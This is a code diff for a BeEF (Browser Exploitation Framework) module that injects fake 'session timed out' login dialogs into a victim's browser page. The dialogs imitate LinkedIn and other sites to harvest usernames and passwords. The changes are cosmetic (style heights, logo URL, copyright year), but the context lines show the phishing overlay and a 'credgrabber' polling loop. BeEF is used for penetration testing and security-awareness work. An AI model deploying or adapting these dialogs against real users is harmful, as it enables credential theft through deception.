@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -112,7 +112,7 @@ beef.execute(function() {
 		// Set appearance using styles, maybe cleaner way to do this with CSS block?
 		var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-radius:8px"';
 		var windowmain = 'style="border:1px #555 solid;"';
- 		var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(109, 132, 180);font-size: 13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: left;height: 18px;"';
+ 		var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(109, 132, 180);font-size: 13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: left;height: 30px;"';
 		var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
 		var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
 		var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: tahoma,verdana,arial,sans-serif;padding-left:30px;"';
@@ -142,7 +142,7 @@ beef.execute(function() {
 		// Set appearance using styles, maybe cleaner way to do this with CSS block?
 		var windowborder = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
 		var windowmain = 'style="border:1px #555 solid;"';
- 		var tbarstyle = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
+ 		var tbarstyle = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 30px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
 
 //-moz-box-shadow: 0 1px 4px #ccc;-webkit-box-shadow: 0 1px 4px #CCC;-o-box-shadow: 0 1px 4px #ccc;box-shadow: 0 1px 4px #CCC;
 
@@ -151,7 +151,7 @@ beef.execute(function() {
 		var box_prestyle = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
 		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
 		var buttonstyle = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
-		var lilogo = 'http://content.linkedin.com/etc/designs/linkedin/katy/global/clientlibs/img/logo.png';
+		var lilogo = 'https://static.licdn.com/sc/h/95o6rrc5ws6mlw6wqzy0xgj7y';
         	var title = 'Session Timed Out <img src="' + lilogo + '" align=right height=20 width=70 alt="LinkedIn">';
 	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
         	var buttonLabel = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';
@@ -219,7 +219,7 @@ beef.execute(function() {
 		// Set appearance using styles, maybe cleaner way to do this with CSS block?
 		var windowborder  = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
 		var windowmain    = 'style="border:1px #555 solid;"';
- 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
+ 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 30px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
 		var bbarstyle     = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
 		var messagestyle  = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
 		var box_prestyle  = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
@@ -249,7 +249,7 @@ beef.execute(function() {
 		// Set appearance using styles, maybe cleaner way to do this with CSS block?
 		var windowborder  = 'style="width:330px;background:white;border: 10px #999999 solid;border-radius:8px;"';
 		var windowmain    = 'style="border:1px #555 solid;"';
- 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 22px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
+ 		var tbarstyle     = 'style="color:white; font-size: 14px;font-family:Arial,sans-serif;font-weight: bold;outline-style: inherit;outline-color: #000000;outline-width: 1px;padding:5px;padding-left:8px;padding-right:6px;text-align: left;height: 30px;line-height:22px;border-bottom: 1px solid #CDCDCD;background: #F4F4F4;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#919191, endColorstr=#595959);background: -webkit-gradient(linear, left top, left bottom, from(#919191), to(#595959));background: -moz-linear-gradient(top,  #919191,  #595959);"';
 		var bbarstyle     = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
 		var messagestyle  = 'style="align:left;font-size:11px;font-family:Arial,sans-serif;margin:10px 15px;line-height:12px;height:40px;"';
 		var box_prestyle  = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
@@ -509,7 +509,7 @@ beef.execute(function() {
 		sneakydiv.setAttribute('style', 'width:400px;position:absolute; top:20%; left:40%; z-index:51; background-color:white;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
 		sneakydiv.setAttribute('align', 'center');
 		document.body.appendChild(sneakydiv);
-		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"buttonpress\").value=\"true\";\' value=\'Ok\'><br/><input type="hidden" id="buttonpress" name="buttonpress" value="false"/>';
+		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"buttonpress\").value=\"true\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"buttonpress\").value=\"true\";\' value=\'Ok\'><br/><input type="hidden" id="buttonpress" name="buttonpress" value="false"/><br/>';
 		
 		// Repeatedly check if button has been pressed		
 		credgrabber = setInterval(checker,1000);
